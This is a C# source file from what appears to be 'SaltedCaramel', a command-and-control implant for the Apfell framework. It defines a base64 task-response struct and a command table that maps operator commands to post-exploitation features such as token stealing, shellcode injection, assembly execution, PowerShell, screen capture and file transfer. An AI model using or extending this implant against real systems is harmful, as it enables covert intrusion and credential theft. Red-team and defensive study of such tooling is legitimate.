using SaltedCaramel.Tasks;
using System;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;

namespace SaltedCaramel
{
    namespace Tasks
    {
        /// <summary>
        /// Struct for formatting task output or other information to send back
        /// to Apfell server
        /// </summary>
        public struct SCTaskResp
        {
            public string response;
            public string id;

            public SCTaskResp(string id, string response)
            {
                this.response = System.Convert.ToBase64String(Encoding.UTF8.GetBytes(response));
                this.id = id;
            }
        }

        /// <summary>
        /// A task to assign to an implant
        /// </summary>
        public class SCTask
        {
            public string command { get; set; }
            public string @params { get; set; }
            public string id { get; set; }
            internal int shortId { get; set; }
#if (DEBUG)
            public string status { get; set; }
            public string message { get; set; }
#else
        internal string status { get; set; }
        internal string message { get; set; }
#endif

            public static Dictionary<string, string> TaskMap = new Dictionary<string, string>()
            {
                { "cd", "ChangeDir" },
                { "download", "Download" },
                { "execute_assembly", "ExecAssembly" },
                { "exit", "Exit" },
                { "jobs", "Jobs" },
                { "jobkill", "Jobs" },
                { "kill", "Kill" },
                { "ls", "DirectoryList" },
                { "make_token", "Token" },
                { "ps", "ProcessList" },
                { "powershell", "Powershell" },
                { "rev2self", "Token" }, // Needs to be split out into its own method + execute
                { "run", "Proc" },
                { "screencapture", "ScreenCapture" },
                { "shell", "Proc" },
                { "shinject", "Shellcode" },
                { "sleep", "Sleep" },
                { "spawn", "Spawn" },
                { "steal_token", "Token" },
                { "upload", "Upload" }
            };

            public SCTask(string command, string @params, string id)
            {
                this.command = command;
                this.@params = @params;
                this.id = id;
            }

        }
    }
}